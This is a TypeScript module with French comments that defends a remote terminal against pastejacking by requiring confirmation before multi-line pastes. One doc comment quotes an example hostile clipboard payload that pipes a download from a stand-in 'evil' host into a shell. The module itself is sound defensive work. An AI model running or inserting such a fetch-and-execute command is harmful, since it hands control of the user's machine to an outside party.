// Décision de collage sûr dans un terminal distant.
//
// Le collage applicatif doit passer par `term.paste()`, qui encadre le texte en
// « bracketed paste » (ESC[200~ … ESC[201~) lorsque le shell distant l'a demandé
// (DECSET 2004). Ce module ne décide que d'une chose, testable sans terminal :
// faut-il confirmer ce collage ? — et combien de lignes annoncer.

/** Vrai si le texte contient un saut de ligne, donc au moins une commande qui
 *  s'exécuterait sans validation manuelle une fois collée. C'est le signal d'un
 *  collage à confirmer : une page web hostile peut déposer dans le presse-papiers
 *  « commande\ncurl http://evil|sh\n » pour faire exécuter la seconde ligne à
 *  l'insu de l'utilisateur (pastejacking). Le bracketed paste neutralise déjà
 *  l'exécution automatique quand le distant l'a activé ; la confirmation est la
 *  défense qui tient même quand il ne l'a pas fait. */
export function collageAValider(texte: string): boolean {
  return /[\r\n]/.test(texte);
}

/** Nombre de lignes qu'un collage produira (0 pour une chaîne vide, au moins 1
 *  sinon). Sert uniquement au libellé de la confirmation. Un saut final ne crée
 *  pas de ligne vide de plus : « a\n » compte pour une ligne. */
export function nombreLignesCollage(texte: string): number {
  if (texte === "") return 0;
  return texte.replace(/[\r\n]+$/, "").split(/\r\n|\r|\n/).length;
}

/** Dépendances d'un collage, injectées pour rester testable sans terminal ni DOM. */
export interface CollageDeps {
  /** Colle le texte — en production, toujours `term.paste()` (bracketed paste). */
  coller: (texte: string) => void;
  /** Demande confirmation pour un collage de `n` lignes ; `true` = poursuivre. */
  confirmer: (n: number) => Promise<boolean>;
}

/** Effectue un collage sûr : rien sur une chaîne vide, confirmation avant un
 *  collage multi-ligne, puis `coller`. Sépare la DÉCISION (testée ici) du
 *  câblage (term.paste / askConfirm, dans main.ts) — garantit qu'aucun chemin ne
 *  peut coller sans passer par `coller`, ni court-circuiter la confirmation. */
export async function effectuerCollage(texte: string, deps: CollageDeps): Promise<void> {
  if (!texte) return;
  if (collageAValider(texte) && !(await deps.confirmer(nombreLignesCollage(texte)))) return;
  deps.coller(texte);
}
